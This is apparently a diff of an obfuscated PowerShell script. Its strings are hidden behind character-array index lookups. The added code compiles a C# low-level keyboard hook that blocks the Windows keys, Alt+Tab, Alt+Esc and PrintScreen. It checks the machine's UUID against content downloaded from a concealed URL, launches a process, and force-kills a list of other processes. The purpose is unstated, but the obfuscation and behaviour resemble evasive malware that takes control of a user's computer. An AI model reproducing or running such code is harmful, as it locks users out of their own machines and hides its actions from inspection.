+$gVBQLrAlvYvN = -join @($OCfEmpwAWqCy[454], $OCfEmpwAWqCy[415], $OCfEmpwAWqCy[157], $OCfEmpwAWqCy[654], $OCfEmpwAWqCy[357], $OCfEmpwAWqCy[37], $OCfEmpwAWqCy[505], $OCfEmpwAWqCy[664])
+$jkMIAnciQPYV = sDmYimBhjKXw $IoqKHLgknFBN $gVBQLrAlvYvN
+$XOfSNHvOwPnA = -join @($OCfEmpwAWqCy[340], $OCfEmpwAWqCy[549], $OCfEmpwAWqCy[3], $OCfEmpwAWqCy[308], $OCfEmpwAWqCy[504])
+$FyYVLQLpLaYo = -join @($OCfEmpwAWqCy[289], $OCfEmpwAWqCy[373], $OCfEmpwAWqCy[679], $OCfEmpwAWqCy[513], $OCfEmpwAWqCy[377], $OCfEmpwAWqCy[178], $OCfEmpwAWqCy[257], $OCfEmpwAWqCy[256])
+$HhMvIcrfFPqg = sDmYimBhjKXw $XOfSNHvOwPnA $FyYVLQLpLaYo
+$IdNSsDYKDktt = -join @($OCfEmpwAWqCy[362], $OCfEmpwAWqCy[487], $OCfEmpwAWqCy[204], $OCfEmpwAWqCy[457], $OCfEmpwAWqCy[365])
+$GLpmJdaaknZh = -join @($OCfEmpwAWqCy[18], $OCfEmpwAWqCy[595], $OCfEmpwAWqCy[562], $OCfEmpwAWqCy[381], $OCfEmpwAWqCy[90], $OCfEmpwAWqCy[218], $OCfEmpwAWqCy[411], $OCfEmpwAWqCy[182])
+$jryrvmCBalkH = sDmYimBhjKXw $IdNSsDYKDktt $GLpmJdaaknZh
+$PdfpsbLDTkUC = -join @($OCfEmpwAWqCy[344], $OCfEmpwAWqCy[601], $OCfEmpwAWqCy[285], $OCfEmpwAWqCy[673], $OCfEmpwAWqCy[710])
+$JBSYmyiqCuxL = -join @($OCfEmpwAWqCy[685], $OCfEmpwAWqCy[610], $OCfEmpwAWqCy[683], $OCfEmpwAWqCy[333], $OCfEmpwAWqCy[431], $OCfEmpwAWqCy[31], $OCfEmpwAWqCy[356], $OCfEmpwAWqCy[535])
+$GBohueJlIaFq = sDmYimBhjKXw $PdfpsbLDTkUC $JBSYmyiqCuxL
+$IMjEsHtJzwEU = -join @($OCfEmpwAWqCy[370], $OCfEmpwAWqCy[558])
+$WGprotoLVVzJ = -join @($OCfEmpwAWqCy[531], $OCfEmpwAWqCy[391], $OCfEmpwAWqCy[16], $OCfEmpwAWqCy[27], $OCfEmpwAWqCy[296], $OCfEmpwAWqCy[460], $OCfEmpwAWqCy[129], $OCfEmpwAWqCy[612])
+$QkrGesrqvsHY = sDmYimBhjKXw $IMjEsHtJzwEU $WGprotoLVVzJ
+$cLXWZwlJuazo = -join @($OCfEmpwAWqCy[141], $OCfEmpwAWqCy[303], $OCfEmpwAWqCy[306])
+$lvxJicWtsLCT = -join @($OCfEmpwAWqCy[133], $OCfEmpwAWqCy[251], $OCfEmpwAWqCy[563], $OCfEmpwAWqCy[40], $OCfEmpwAWqCy[462], $OCfEmpwAWqCy[639], $OCfEmpwAWqCy[172], $OCfEmpwAWqCy[134])
+$AjAphMzzUzpz = sDmYimBhjKXw $cLXWZwlJuazo $lvxJicWtsLCT
+$qnARspouQYqk = -join @($OCfEmpwAWqCy[53], $OCfEmpwAWqCy[147], $OCfEmpwAWqCy[480], $OCfEmpwAWqCy[552], $OCfEmpwAWqCy[284], $OCfEmpwAWqCy[366], $OCfEmpwAWqCy[579], $OCfEmpwAWqCy[678], $OCfEmpwAWqCy[495], $OCfEmpwAWqCy[63], $OCfEmpwAWqCy[705], $OCfEmpwAWqCy[631])
+$CeWIoytTJidh = -join @($OCfEmpwAWqCy[77], $OCfEmpwAWqCy[122], $OCfEmpwAWqCy[25], $OCfEmpwAWqCy[603], $OCfEmpwAWqCy[525], $OCfEmpwAWqCy[461], $OCfEmpwAWqCy[385], $OCfEmpwAWqCy[719])
+$uUvBMmCYPSTI = sDmYimBhjKXw $qnARspouQYqk $CeWIoytTJidh
+$srgoqcYUawpW = -join @($OCfEmpwAWqCy[746], $OCfEmpwAWqCy[326], $OCfEmpwAWqCy[737], $OCfEmpwAWqCy[582], $OCfEmpwAWqCy[529], $OCfEmpwAWqCy[455])
+$tVvaAAvBXyRx = -join @($OCfEmpwAWqCy[43], $OCfEmpwAWqCy[166], $OCfEmpwAWqCy[650], $OCfEmpwAWqCy[662], $OCfEmpwAWqCy[420], $OCfEmpwAWqCy[336], $OCfEmpwAWqCy[179], $OCfEmpwAWqCy[453])
+$UflcgVWwcJPj = sDmYimBhjKXw $srgoqcYUawpW $tVvaAAvBXyRx
+$eSqegwnHFwqp = -join @($OCfEmpwAWqCy[217], $OCfEmpwAWqCy[238], $OCfEmpwAWqCy[542], $OCfEmpwAWqCy[632], $OCfEmpwAWqCy[733], $OCfEmpwAWqCy[414], $OCfEmpwAWqCy[145], $OCfEmpwAWqCy[131], $OCfEmpwAWqCy[10], $OCfEmpwAWqCy[205], $OCfEmpwAWqCy[224], $OCfEmpwAWqCy[557], $OCfEmpwAWqCy[88], $OCfEmpwAWqCy[298])
+$HsZqomdofpkx = -join @($OCfEmpwAWqCy[426], $OCfEmpwAWqCy[54], $OCfEmpwAWqCy[554], $OCfEmpwAWqCy[89], $OCfEmpwAWqCy[200], $OCfEmpwAWqCy[278], $OCfEmpwAWqCy[162], $OCfEmpwAWqCy[108])
+$PKJFoHgQlqFl = sDmYimBhjKXw $eSqegwnHFwqp $HsZqomdofpkx
+$VEUAYXLwLukF = -join @($OCfEmpwAWqCy[223], $OCfEmpwAWqCy[270], $OCfEmpwAWqCy[33], $OCfEmpwAWqCy[222])
+$QZpVhoXhHhig = -join @($OCfEmpwAWqCy[310], $OCfEmpwAWqCy[565], $OCfEmpwAWqCy[385], $OCfEmpwAWqCy[483], $OCfEmpwAWqCy[187], $OCfEmpwAWqCy[441], $OCfEmpwAWqCy[508], $OCfEmpwAWqCy[443])
+$gRDKOatFdLWd = sDmYimBhjKXw $VEUAYXLwLukF $QZpVhoXhHhig
+$olNHyMUyYxML = -join @($OCfEmpwAWqCy[395], $OCfEmpwAWqCy[92], $OCfEmpwAWqCy[146], $OCfEmpwAWqCy[93])
+$EeYMiRWEzIXS = -join @($OCfEmpwAWqCy[724], $OCfEmpwAWqCy[652], $OCfEmpwAWqCy[681], $OCfEmpwAWqCy[240], $OCfEmpwAWqCy[132], $OCfEmpwAWqCy[304], $OCfEmpwAWqCy[71], $OCfEmpwAWqCy[139])
+$VrWNBnUWAvez = sDmYimBhjKXw $olNHyMUyYxML $EeYMiRWEzIXS
+$RiKpuggglzoP = -join @($OCfEmpwAWqCy[141], $OCfEmpwAWqCy[196], $OCfEmpwAWqCy[371], $OCfEmpwAWqCy[17])
+$CRuzTWvKZKSX = -join @($OCfEmpwAWqCy[56], $OCfEmpwAWqCy[651], $OCfEmpwAWqCy[589], $OCfEmpwAWqCy[280], $OCfEmpwAWqCy[656], $OCfEmpwAWqCy[81], $OCfEmpwAWqCy[475], $OCfEmpwAWqCy[95])
+$VqTChwtxtpcR = sDmYimBhjKXw $RiKpuggglzoP $CRuzTWvKZKSX
+$VFoXGkTOXkCn = -join @($OCfEmpwAWqCy[324], $OCfEmpwAWqCy[281], $OCfEmpwAWqCy[422], $OCfEmpwAWqCy[194], $OCfEmpwAWqCy[190], $OCfEmpwAWqCy[375])
+$cRHROEKJzQEs = -join @($OCfEmpwAWqCy[378], $OCfEmpwAWqCy[532], $OCfEmpwAWqCy[307], $OCfEmpwAWqCy[84], $OCfEmpwAWqCy[58], $OCfEmpwAWqCy[239], $OCfEmpwAWqCy[445], $OCfEmpwAWqCy[23])
+$iqiyREIMJUFr = sDmYimBhjKXw $VFoXGkTOXkCn $cRHROEKJzQEs
+$RMOPuHhrmwPb = -join @($OCfEmpwAWqCy[242], $OCfEmpwAWqCy[403], $OCfEmpwAWqCy[142], $OCfEmpwAWqCy[636])
+$dcNMepziyFtR = -join @($OCfEmpwAWqCy[86], $OCfEmpwAWqCy[471], $OCfEmpwAWqCy[233], $OCfEmpwAWqCy[432], $OCfEmpwAWqCy[301], $OCfEmpwAWqCy[511], $OCfEmpwAWqCy[599], $OCfEmpwAWqCy[468])
+$UsjGCqOsnAaY = sDmYimBhjKXw $RMOPuHhrmwPb $dcNMepziyFtR
+$XNYUcwsybMNf = -join @($OCfEmpwAWqCy[232], $OCfEmpwAWqCy[22], $OCfEmpwAWqCy[578], $OCfEmpwAWqCy[590])
+$ovGQGdJkWrOI = -join @($OCfEmpwAWqCy[96], $OCfEmpwAWqCy[349], $OCfEmpwAWqCy[272], $OCfEmpwAWqCy[405], $OCfEmpwAWqCy[588], $OCfEmpwAWqCy[115], $OCfEmpwAWqCy[591], $OCfEmpwAWqCy[574])
+$eBpHyTQqjgjk = sDmYimBhjKXw $XNYUcwsybMNf $ovGQGdJkWrOI
+$EfTEMWkBdByj = -join @($OCfEmpwAWqCy[620], $OCfEmpwAWqCy[367], $OCfEmpwAWqCy[11], $OCfEmpwAWqCy[173], $OCfEmpwAWqCy[287], $OCfEmpwAWqCy[323], $OCfEmpwAWqCy[266], $OCfEmpwAWqCy[614], $OCfEmpwAWqCy[197], $OCfEmpwAWqCy[492], $OCfEmpwAWqCy[438], $OCfEmpwAWqCy[97], $OCfEmpwAWqCy[623], $OCfEmpwAWqCy[583], $OCfEmpwAWqCy[703], $OCfEmpwAWqCy[484], $OCfEmpwAWqCy[569], $OCfEmpwAWqCy[593], $OCfEmpwAWqCy[68], $OCfEmpwAWqCy[567], $OCfEmpwAWqCy[294], $OCfEmpwAWqCy[604], $OCfEmpwAWqCy[745], $OCfEmpwAWqCy[263])
+$QaYZDxOsjplf = -join @($OCfEmpwAWqCy[76], $OCfEmpwAWqCy[248], $OCfEmpwAWqCy[646], $OCfEmpwAWqCy[283], $OCfEmpwAWqCy[742], $OCfEmpwAWqCy[397], $OCfEmpwAWqCy[701], $OCfEmpwAWqCy[325])
+$RJjRJAHzLMLG = sDmYimBhjKXw $EfTEMWkBdByj $QaYZDxOsjplf
+$fdWVkQLKWtMf = -join @($OCfEmpwAWqCy[338], $OCfEmpwAWqCy[711], $OCfEmpwAWqCy[713], $OCfEmpwAWqCy[658], $OCfEmpwAWqCy[151], $OCfEmpwAWqCy[156], $OCfEmpwAWqCy[466], $OCfEmpwAWqCy[619], $OCfEmpwAWqCy[419])
+$DKIRlvUEPFFB = -join @($OCfEmpwAWqCy[2], $OCfEmpwAWqCy[580], $OCfEmpwAWqCy[104], $OCfEmpwAWqCy[158], $OCfEmpwAWqCy[230], $OCfEmpwAWqCy[478], $OCfEmpwAWqCy[618], $OCfEmpwAWqCy[149])
+$QrwiqHbySSKQ = sDmYimBhjKXw $fdWVkQLKWtMf $DKIRlvUEPFFB
+$iKRkwHRykoJL = -join @($OCfEmpwAWqCy[290], $OCfEmpwAWqCy[605], $OCfEmpwAWqCy[459], $OCfEmpwAWqCy[659], $OCfEmpwAWqCy[585], $OCfEmpwAWqCy[435], $OCfEmpwAWqCy[1])
+$slMwTAlpLOdn = -join @($OCfEmpwAWqCy[379], $OCfEmpwAWqCy[530], $OCfEmpwAWqCy[83], $OCfEmpwAWqCy[120], $OCfEmpwAWqCy[29], $OCfEmpwAWqCy[564], $OCfEmpwAWqCy[608], $OCfEmpwAWqCy[394])
+$cITvRTQMUUPy = sDmYimBhjKXw $iKRkwHRykoJL $slMwTAlpLOdn
+$kIHTyzrddyuW = -join @($OCfEmpwAWqCy[227], $OCfEmpwAWqCy[743], $OCfEmpwAWqCy[481], $OCfEmpwAWqCy[704], $OCfEmpwAWqCy[39])
+$ipyyvCUVkvpu = -join @($OCfEmpwAWqCy[641], $OCfEmpwAWqCy[350], $OCfEmpwAWqCy[473], $OCfEmpwAWqCy[269], $OCfEmpwAWqCy[470], $OCfEmpwAWqCy[38], $OCfEmpwAWqCy[7], $OCfEmpwAWqCy[494])
+$kZkDqSgguhXl = sDmYimBhjKXw $kIHTyzrddyuW $ipyyvCUVkvpu
+$aEYaibfMzYfC = -join @($OCfEmpwAWqCy[195], $OCfEmpwAWqCy[78], $OCfEmpwAWqCy[143], $OCfEmpwAWqCy[13], $OCfEmpwAWqCy[192], $OCfEmpwAWqCy[225], $OCfEmpwAWqCy[715], $OCfEmpwAWqCy[335], $OCfEmpwAWqCy[199], $OCfEmpwAWqCy[309], $OCfEmpwAWqCy[299], $OCfEmpwAWqCy[476], $OCfEmpwAWqCy[140], $OCfEmpwAWqCy[288], $OCfEmpwAWqCy[152], $OCfEmpwAWqCy[559], $OCfEmpwAWqCy[577], $OCfEmpwAWqCy[688], $OCfEmpwAWqCy[160], $OCfEmpwAWqCy[319], $OCfEmpwAWqCy[254], $OCfEmpwAWqCy[440])
+$mbKRUdUwrzSb = -join @($OCfEmpwAWqCy[4], $OCfEmpwAWqCy[527], $OCfEmpwAWqCy[485], $OCfEmpwAWqCy[305], $OCfEmpwAWqCy[220], $OCfEmpwAWqCy[548], $OCfEmpwAWqCy[522], $OCfEmpwAWqCy[514])
+$alYHoadobztA = sDmYimBhjKXw $aEYaibfMzYfC $mbKRUdUwrzSb
+$QNSScFyECXdC = -join @($OCfEmpwAWqCy[540], $OCfEmpwAWqCy[568], $OCfEmpwAWqCy[320], $OCfEmpwAWqCy[209], $OCfEmpwAWqCy[387], $OCfEmpwAWqCy[546], $OCfEmpwAWqCy[401], $OCfEmpwAWqCy[643], $OCfEmpwAWqCy[739], $OCfEmpwAWqCy[584], $OCfEmpwAWqCy[45], $OCfEmpwAWqCy[177], $OCfEmpwAWqCy[497], $OCfEmpwAWqCy[727], $OCfEmpwAWqCy[165], $OCfEmpwAWqCy[512], $OCfEmpwAWqCy[295], $OCfEmpwAWqCy[293], $OCfEmpwAWqCy[714], $OCfEmpwAWqCy[449])
+$wXcEEznasBTc = -join @($OCfEmpwAWqCy[560], $OCfEmpwAWqCy[277], $OCfEmpwAWqCy[348], $OCfEmpwAWqCy[507], $OCfEmpwAWqCy[65], $OCfEmpwAWqCy[332], $OCfEmpwAWqCy[109], $OCfEmpwAWqCy[87])
+$yoBrcDLhPUjE = sDmYimBhjKXw $QNSScFyECXdC $wXcEEznasBTc
+$WOIJraLbrjnX = -join @($OCfEmpwAWqCy[572], $OCfEmpwAWqCy[617], $OCfEmpwAWqCy[75], $OCfEmpwAWqCy[161], $OCfEmpwAWqCy[598], $OCfEmpwAWqCy[721], $OCfEmpwAWqCy[424])
+$LwHKBXFFkJsq = -join @($OCfEmpwAWqCy[337], $OCfEmpwAWqCy[264], $OCfEmpwAWqCy[622], $OCfEmpwAWqCy[503], $OCfEmpwAWqCy[624], $OCfEmpwAWqCy[42], $OCfEmpwAWqCy[44], $OCfEmpwAWqCy[488])
+$WIeBZhFHMdYX = sDmYimBhjKXw $WOIJraLbrjnX $LwHKBXFFkJsq
+$ngrCFDumXHQS = -join @($OCfEmpwAWqCy[242], $OCfEmpwAWqCy[163], $OCfEmpwAWqCy[119])
+$vaFKnjKEcSxA = -join @($OCfEmpwAWqCy[176], $OCfEmpwAWqCy[62], $OCfEmpwAWqCy[124], $OCfEmpwAWqCy[322], $OCfEmpwAWqCy[729], $OCfEmpwAWqCy[383], $OCfEmpwAWqCy[372], $OCfEmpwAWqCy[331])
+$NcuqaXbjcXmC = sDmYimBhjKXw $ngrCFDumXHQS $vaFKnjKEcSxA
+$dLJmcORdzlZF = -join @($OCfEmpwAWqCy[242], $OCfEmpwAWqCy[208], $OCfEmpwAWqCy[291], $OCfEmpwAWqCy[575], $OCfEmpwAWqCy[486])
+$ibSCHdQnATxs = -join @($OCfEmpwAWqCy[189], $OCfEmpwAWqCy[672], $OCfEmpwAWqCy[517], $OCfEmpwAWqCy[409], $OCfEmpwAWqCy[629], $OCfEmpwAWqCy[185], $OCfEmpwAWqCy[416], $OCfEmpwAWqCy[735])
+$mqNHPyqsJEFI = sDmYimBhjKXw $dLJmcORdzlZF $ibSCHdQnATxs
+$OBCEefpBGaha = -join @($OCfEmpwAWqCy[545], $OCfEmpwAWqCy[66], $OCfEmpwAWqCy[274], $OCfEmpwAWqCy[61])
+$uLVGCHXjUXOu = -join @($OCfEmpwAWqCy[64], $OCfEmpwAWqCy[467], $OCfEmpwAWqCy[576], $OCfEmpwAWqCy[183], $OCfEmpwAWqCy[359], $OCfEmpwAWqCy[667], $OCfEmpwAWqCy[170], $OCfEmpwAWqCy[543])
+$xUiJHlygmbmU = sDmYimBhjKXw $OBCEefpBGaha $uLVGCHXjUXOu
+$nZTjmspAuFot = -join @($OCfEmpwAWqCy[144], $OCfEmpwAWqCy[709])
+$lGSPrRShLNNW = -join @($OCfEmpwAWqCy[262], $OCfEmpwAWqCy[425], $OCfEmpwAWqCy[725], $OCfEmpwAWqCy[202], $OCfEmpwAWqCy[566], $OCfEmpwAWqCy[316], $OCfEmpwAWqCy[26], $OCfEmpwAWqCy[670])
+$rfryGmUbxmRj = sDmYimBhjKXw $nZTjmspAuFot $lGSPrRShLNNW
+$RWxocOWPNXSQ = -join @($OCfEmpwAWqCy[640], $OCfEmpwAWqCy[380], $OCfEmpwAWqCy[49])
+$QhCcLjChrnTu = -join @($OCfEmpwAWqCy[665], $OCfEmpwAWqCy[116], $OCfEmpwAWqCy[644], $OCfEmpwAWqCy[241], $OCfEmpwAWqCy[353], $OCfEmpwAWqCy[472], $OCfEmpwAWqCy[164], $OCfEmpwAWqCy[315])
+$LPPQqHdngArU = sDmYimBhjKXw $RWxocOWPNXSQ $QhCcLjChrnTu
+$thljHXvEZoFg = -join @($OCfEmpwAWqCy[723], $OCfEmpwAWqCy[0], $OCfEmpwAWqCy[252])
+$ymWBBEfkTUPA = -join @($OCfEmpwAWqCy[463], $OCfEmpwAWqCy[271], $OCfEmpwAWqCy[364], $OCfEmpwAWqCy[750], $OCfEmpwAWqCy[490], $OCfEmpwAWqCy[268], $OCfEmpwAWqCy[8], $OCfEmpwAWqCy[103])
+$HItYxlduCTNN = sDmYimBhjKXw $thljHXvEZoFg $ymWBBEfkTUPA
+$DZAFcqouxWiw = -join @($OCfEmpwAWqCy[550])
+$lmKqoUHKUnKc = -join @($OCfEmpwAWqCy[355], $OCfEmpwAWqCy[358], $OCfEmpwAWqCy[436], $OCfEmpwAWqCy[400], $OCfEmpwAWqCy[526], $OCfEmpwAWqCy[260], $OCfEmpwAWqCy[616], $OCfEmpwAWqCy[215])
+$iGQKiukDIKHN = sDmYimBhjKXw $DZAFcqouxWiw $lmKqoUHKUnKc
+$amEnFjNtQBCi = -join @($OCfEmpwAWqCy[407], $OCfEmpwAWqCy[82], $OCfEmpwAWqCy[686], $OCfEmpwAWqCy[247])
+$tfsQUpPVomeM = -join @($OCfEmpwAWqCy[515], $OCfEmpwAWqCy[642], $OCfEmpwAWqCy[521], $OCfEmpwAWqCy[94], $OCfEmpwAWqCy[159], $OCfEmpwAWqCy[539], $OCfEmpwAWqCy[117], $OCfEmpwAWqCy[234])
+$IMfeCMQOHNhg = sDmYimBhjKXw $amEnFjNtQBCi $tfsQUpPVomeM
+$TQxbRPoyFaxc = -join @($OCfEmpwAWqCy[201], $OCfEmpwAWqCy[738], $OCfEmpwAWqCy[538])
+$limgJYLLGWYN = -join @($OCfEmpwAWqCy[687], $OCfEmpwAWqCy[728], $OCfEmpwAWqCy[35], $OCfEmpwAWqCy[499], $OCfEmpwAWqCy[410], $OCfEmpwAWqCy[273], $OCfEmpwAWqCy[50], $OCfEmpwAWqCy[175])
+$FybHGuYuqhGG = sDmYimBhjKXw $TQxbRPoyFaxc $limgJYLLGWYN
+$aKxjSaSmGuwp = -join @($OCfEmpwAWqCy[732], $OCfEmpwAWqCy[374], $OCfEmpwAWqCy[59], $OCfEmpwAWqCy[211], $OCfEmpwAWqCy[417])
+$DKpAWSmMOwFm = -join @($OCfEmpwAWqCy[229], $OCfEmpwAWqCy[28], $OCfEmpwAWqCy[30], $OCfEmpwAWqCy[429], $OCfEmpwAWqCy[402], $OCfEmpwAWqCy[244], $OCfEmpwAWqCy[734], $OCfEmpwAWqCy[282])
+$TRYZtnpPtQQi = sDmYimBhjKXw $aKxjSaSmGuwp $DKpAWSmMOwFm
+$PQRCBDNdgHDp = -join @($OCfEmpwAWqCy[72], $OCfEmpwAWqCy[135], $OCfEmpwAWqCy[501])
+$YKVIMxNWKbqt = -join @($OCfEmpwAWqCy[663], $OCfEmpwAWqCy[111], $OCfEmpwAWqCy[693], $OCfEmpwAWqCy[448], $OCfEmpwAWqCy[153], $OCfEmpwAWqCy[452], $OCfEmpwAWqCy[169], $OCfEmpwAWqCy[121])
+$ajEVqOfWeBWs = sDmYimBhjKXw $PQRCBDNdgHDp $YKVIMxNWKbqt
+$MmaMhbvYLSES = -join @($OCfEmpwAWqCy[128], $OCfEmpwAWqCy[675], $OCfEmpwAWqCy[386], $OCfEmpwAWqCy[114], $OCfEmpwAWqCy[150], $OCfEmpwAWqCy[506], $OCfEmpwAWqCy[327])
+$ieWMCmWHhSfb = -join @($OCfEmpwAWqCy[621], $OCfEmpwAWqCy[702], $OCfEmpwAWqCy[213], $OCfEmpwAWqCy[155], $OCfEmpwAWqCy[47], $OCfEmpwAWqCy[447], $OCfEmpwAWqCy[523], $OCfEmpwAWqCy[168])
+$rGENwMebFLva = sDmYimBhjKXw $MmaMhbvYLSES $ieWMCmWHhSfb
+$yAAlvrYixWrk = -join @($OCfEmpwAWqCy[456], $OCfEmpwAWqCy[212], $OCfEmpwAWqCy[427])
+$dBlayxJhMZtT = -join @($OCfEmpwAWqCy[382], $OCfEmpwAWqCy[509], $OCfEmpwAWqCy[533], $OCfEmpwAWqCy[536], $OCfEmpwAWqCy[80], $OCfEmpwAWqCy[102], $OCfEmpwAWqCy[328], $OCfEmpwAWqCy[127])
+$RnTECaaSueyW = sDmYimBhjKXw $yAAlvrYixWrk $dBlayxJhMZtT
+$IEOTYzhpphgD = -join @($OCfEmpwAWqCy[439])
+$jhGpVHQYmApQ = -join @($OCfEmpwAWqCy[722], $OCfEmpwAWqCy[690], $OCfEmpwAWqCy[219], $OCfEmpwAWqCy[451], $OCfEmpwAWqCy[100], $OCfEmpwAWqCy[720], $OCfEmpwAWqCy[32], $OCfEmpwAWqCy[354])
+$KSbgBkzqotCR = sDmYimBhjKXw $IEOTYzhpphgD $jhGpVHQYmApQ
+$WNyeMcLCklvH = -join @($OCfEmpwAWqCy[123], $OCfEmpwAWqCy[524])
+$zjKXMrCfYSLZ = -join @($OCfEmpwAWqCy[5], $OCfEmpwAWqCy[726], $OCfEmpwAWqCy[520], $OCfEmpwAWqCy[730], $OCfEmpwAWqCy[692], $OCfEmpwAWqCy[684], $OCfEmpwAWqCy[261], $OCfEmpwAWqCy[214])
+$kJeGnhGhxrer = sDmYimBhjKXw $WNyeMcLCklvH $zjKXMrCfYSLZ
+$WVDdgjcJMCBZ = -join @($OCfEmpwAWqCy[174], $OCfEmpwAWqCy[313], $OCfEmpwAWqCy[747])
+$EovRSBeEGvPe = -join @($OCfEmpwAWqCy[645], $OCfEmpwAWqCy[694], $OCfEmpwAWqCy[384], $OCfEmpwAWqCy[198], $OCfEmpwAWqCy[748], $OCfEmpwAWqCy[52], $OCfEmpwAWqCy[547], $OCfEmpwAWqCy[647])
+$PzCpXSxxbzut = sDmYimBhjKXw $WVDdgjcJMCBZ $EovRSBeEGvPe
+$lbhYOXifsxFh = -join @($OCfEmpwAWqCy[456], $OCfEmpwAWqCy[541], $OCfEmpwAWqCy[73], $OCfEmpwAWqCy[600], $OCfEmpwAWqCy[555])
+$OaqsJAvyHnZD = -join @($OCfEmpwAWqCy[48], $OCfEmpwAWqCy[167], $OCfEmpwAWqCy[342], $OCfEmpwAWqCy[551], $OCfEmpwAWqCy[207], $OCfEmpwAWqCy[534], $OCfEmpwAWqCy[609], $OCfEmpwAWqCy[297])
+$vRsyRTIyvvTc = sDmYimBhjKXw $lbhYOXifsxFh $OaqsJAvyHnZD
+try { $RssUyjNYVftj = $RssUyjNYVftj | ConvertFrom-Json } catch { }
+$UeCpSCvTqGPG = 'using System; using System.Runtime.InteropServices; using System.Diagnostics; public class KeyBlock { private const int WH_KEYBOARD_LL = 13; private const int WM_KEYDOWN = 0x0100; private const int WM_SYSKEYDOWN = 0x0104; [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)] private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId); [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)] [return: MarshalAs(UnmanagedType.Bool)] private static extern bool UnhookWindowsHookEx(IntPtr hhk); [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)] private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam); [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)] private static extern IntPtr GetModuleHandle(string lpModuleName); [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow(); [DllImport("user32.dll", SetLastError=true)] public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId); [DllImport("user32.dll")] public static extern bool SetWindowDisplayAffinity(IntPtr hWnd, uint dwAffinity); public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam); private static LowLevelKeyboardProc _proc = HookCallback; private static IntPtr _hookID = IntPtr.Zero; public static bool ExitTriggered = false; public static void BlockKeys() { if (_hookID == IntPtr.Zero) { using (Process curProcess = Process.GetCurrentProcess()) using (ProcessModule curModule = curProcess.MainModule) { _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, GetModuleHandle(curModule.ModuleName), 0); } } } public static void UnblockKeys() { if (_hookID != IntPtr.Zero) { UnhookWindowsHookEx(_hookID); _hookID = IntPtr.Zero; } } private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) { if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)) { int vkCode = Marshal.ReadInt32(lParam); bool alt = (Marshal.ReadInt32(lParam, 8) & 32) != 0; if (vkCode == 70 && alt) { ExitTriggered = true; return (IntPtr)1; } if (vkCode == 91 || vkCode == 92) return (IntPtr)1; if (vkCode == 9 && alt) return (IntPtr)1; if (vkCode == 27 && alt) return (IntPtr)1; if (vkCode == 0x2C) return (IntPtr)1; } return CallNextHookEx(_hookID, nCode, wParam, lParam); } }'
 try {
-$QHpvKSwIGqeJ = $WIsDzUeMIuEl
-try { $QHpvKSwIGqeJ = (Get-CimInstance -Class $eZhPcWQnfvDh).UUID } catch { }
+$vAcGbXbaCJdu = $NcuqaXbjcXmC
+try { $vAcGbXbaCJdu = (Get-CimInstance -Class $QrwiqHbySSKQ).UUID } catch { }
 try {
-$GyMizrFZikhN = (Invoke-WebRequest -Uri $jKEAXejQslPz -UseBasicParsing -ErrorAction SilentlyContinue).Content
-} catch { $GyMizrFZikhN = "" }
-if ($GyMizrFZikhN -match $QHpvKSwIGqeJ) {
-qKdRktBcgZJt $yqEreLnfxUxG $PolXUFvsCFRJ 5
+$ZfqXQRvKSbuz = (Invoke-WebRequest -Uri $AeXWFsWYMBBf -UseBasicParsing -ErrorAction SilentlyContinue).Content
+} catch { $ZfqXQRvKSbuz = "" }
+if ($ZfqXQRvKSbuz -match $vAcGbXbaCJdu) {
+DmGjLBCMcXLr $AjAphMzzUzpz $uUvBMmCYPSTI 5
 exit 0
 }
-$iWuhBhwQSCDd = $null
 try {
-$iWuhBhwQSCDd = Start-Process -FilePath $TkTMePdGDTVk -ArgumentList $QKoEkPTajPQX -PassThru
+Start-Process -FilePath $UsjGCqOsnAaY -ArgumentList $RJjRJAHzLMLG
 } catch {
-qKdRktBcgZJt $PLVtehsIpqHu $YekcWqWKNEmO 5
+DmGjLBCMcXLr $gRDKOatFdLWd $mqNHPyqsJEFI 5
 exit 1
 }
-Start-Sleep -Seconds 5
-if (-not $iWuhBhwQSCDd -or $iWuhBhwQSCDd.HasExited) {
-qKdRktBcgZJt $PLVtehsIpqHu $xcdjQhfFTXAd 5
+$QhFKBTvwpVlg = [System.Diagnostics.Stopwatch]::StartNew()
+while (-not (Get-Process -Name $rfryGmUbxmRj -ErrorAction SilentlyContinue | Where-Object { $_.MainWindowHandle -ne 0 })) {
+if ($QhFKBTvwpVlg.Elapsed.TotalSeconds -gt 15) {
+DmGjLBCMcXLr $gRDKOatFdLWd $xUiJHlygmbmU 5
 exit 1
+}
+Start-Sleep -Milliseconds 500
 }
 try {
-foreach ($BIcEZrtCqmHB in $flPcoEboIdtV) {
-$TlJJAvLcdoEj = $BIcEZrtCqmHB -replace "\.exe`$",""
-if (Get-Process -Name $TlJJAvLcdoEj -ErrorAction SilentlyContinue) {
-if ($BIcEZrtCqmHB -notmatch "\.exe`$") { $BIcEZrtCqmHB = "${v_b}.exe" }
-try { taskkill /F /IM $BIcEZrtCqmHB /T 2>&1 | Out-Null } catch {}
+foreach ($jieIUQizFYZo in $RssUyjNYVftj) {
+$SUIQTPDcJpIO = $jieIUQizFYZo -replace "\.exe`$",""
+if (Get-Process -Name $SUIQTPDcJpIO -ErrorAction SilentlyContinue) {
+if ($jieIUQizFYZo -notmatch "\.exe`$") { $jieIUQizFYZo = "$jieIUQizFYZo.exe" }
+try { taskkill /F /IM $jieIUQizFYZo /T 2>&1 | Out-Null } catch {}
 }
 }
 } catch { }
-if (Get-Process -Name $aBaKGyzbqfXF -ErrorAction SilentlyContinue) {
-try { taskkill /F /IM $rnyyTIYIxzvI /T 2>&1 | Out-Null } catch {}
+if (Get-Process -Name $LPPQqHdngArU -ErrorAction SilentlyContinue) {
+try { taskkill /F /IM $eBpHyTQqjgjk 2>&1 | Out-Null } catch {}
 }
 try {
